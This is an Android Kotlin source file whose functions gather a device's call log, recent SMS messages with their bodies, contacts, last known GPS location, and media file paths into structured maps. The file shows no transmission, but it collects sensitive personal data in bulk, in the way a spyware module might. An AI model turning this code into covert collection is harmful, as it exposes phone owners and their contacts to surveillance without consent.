package com.example.myapplication3

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.Location
import android.location.LocationManager
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import androidx.core.app.ActivityCompat
import java.text.SimpleDateFormat
import java.util.*

// Retrieve call logs in a structured format
fun getCallLogs(context: Context): List<Map<String, String>> {
    val callLogsList = mutableListOf<Map<String, String>>()
    val cursor: Cursor? = context.contentResolver.query(
        CallLog.Calls.CONTENT_URI,
        null,
        null,
        null,
        null
    )

    cursor?.use {
        val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
        val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
        val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)

        while (it.moveToNext()) {
            val number = it.getString(numberIndex)
            val type = it.getString(typeIndex)
            val dateMillis = it.getLong(dateIndex)
            val formattedDate = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ssZ", Locale.getDefault()).format(Date(dateMillis))

            callLogsList.add(
                mapOf(
                    "number" to number,
                    "type" to type,
                    "date" to formattedDate
                )
            )
        }
    }
    return callLogsList
}

// Retrieve SMS logs in a structured format
fun getSMSLogs(context: Context, limit: Int = 100): List<Map<String, String>> {
    val smsList = mutableListOf<Map<String, String>>()
    val uri: Uri = Uri.parse("content://sms")
    val cursor: Cursor? = context.contentResolver.query(
        uri,
        null,
        null,
        null,
        "date DESC" // Sort by latest SMS first
    )

    cursor?.use {
        val addressIndex = it.getColumnIndex("address")
        val bodyIndex = it.getColumnIndex("body")

        var count = 0
        while (it.moveToNext() && count < limit) {
            val address = it.getString(addressIndex)
            val body = it.getString(bodyIndex)
            smsList.add(
                mapOf(
                    "from" to address,
                    "message" to body
                )
            )
            count++
        }
    }
    return smsList
}

// Retrieve contacts in a structured format
fun getContacts(context: Context): List<Map<String, String>> {
    val contactsList = mutableListOf<Map<String, String>>()
    val uri: Uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
    val cursor: Cursor? = context.contentResolver.query(uri, null, null, null, null)

    cursor?.use {
        val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
        val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

        while (it.moveToNext()) {
            val name = it.getString(nameIndex)
            val number = it.getString(numberIndex)
            contactsList.add(
                mapOf(
                    "name" to name,
                    "number" to number
                )
            )
        }
    }
    return contactsList
}

// Retrieve location in a structured format
fun getLocation(context: Context): Map<String, Double> {
    val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager

    if (ActivityCompat.checkSelfPermission(
            context,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) != PackageManager.PERMISSION_GRANTED
    ) {
        return mapOf("latitude" to 0.0, "longitude" to 0.0)
    }

    val location: Location? = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
    return location?.let {
        mapOf("latitude" to it.latitude, "longitude" to it.longitude)
    } ?: mapOf("latitude" to 0.0, "longitude" to 0.0)
}

// Retrieve media files in a structured format
fun getMediaFiles(context: Context): List<Map<String, String>> {
    val mediaFiles = mutableListOf<Map<String, String>>()

    // Get images
    val imageCursor: Cursor? = context.contentResolver.query(
        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
        null,
        null,
        null,
        null
    )

    imageCursor?.use {
        val dataIndex = it.getColumnIndex(MediaStore.Images.Media.DATA)
        while (it.moveToNext()) {
            val imagePath = it.getString(dataIndex)
            mediaFiles.add(mapOf("type" to "image", "path" to imagePath))
        }
    }

    // Get videos
    val videoCursor: Cursor? = context.contentResolver.query(
        MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
        null,
        null,
        null,
        null
    )

    videoCursor?.use {
        val dataIndex = it.getColumnIndex(MediaStore.Video.Media.DATA)
        while (it.moveToNext()) {
            val videoPath = it.getString(dataIndex)
            mediaFiles.add(mapOf("type" to "video", "path" to videoPath))
        }
    }

    // Get audio
    val audioCursor: Cursor? = context.contentResolver.query(
        MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
        null,
        null,
        null,
        null
    )

    audioCursor?.use {
        val dataIndex = it.getColumnIndex(MediaStore.Audio.Media.DATA)
        while (it.moveToNext()) {
            val audioPath = it.getString(dataIndex)
            mediaFiles.add(mapOf("type" to "audio", "path" to audioPath))
        }
    }

    return mediaFiles
}
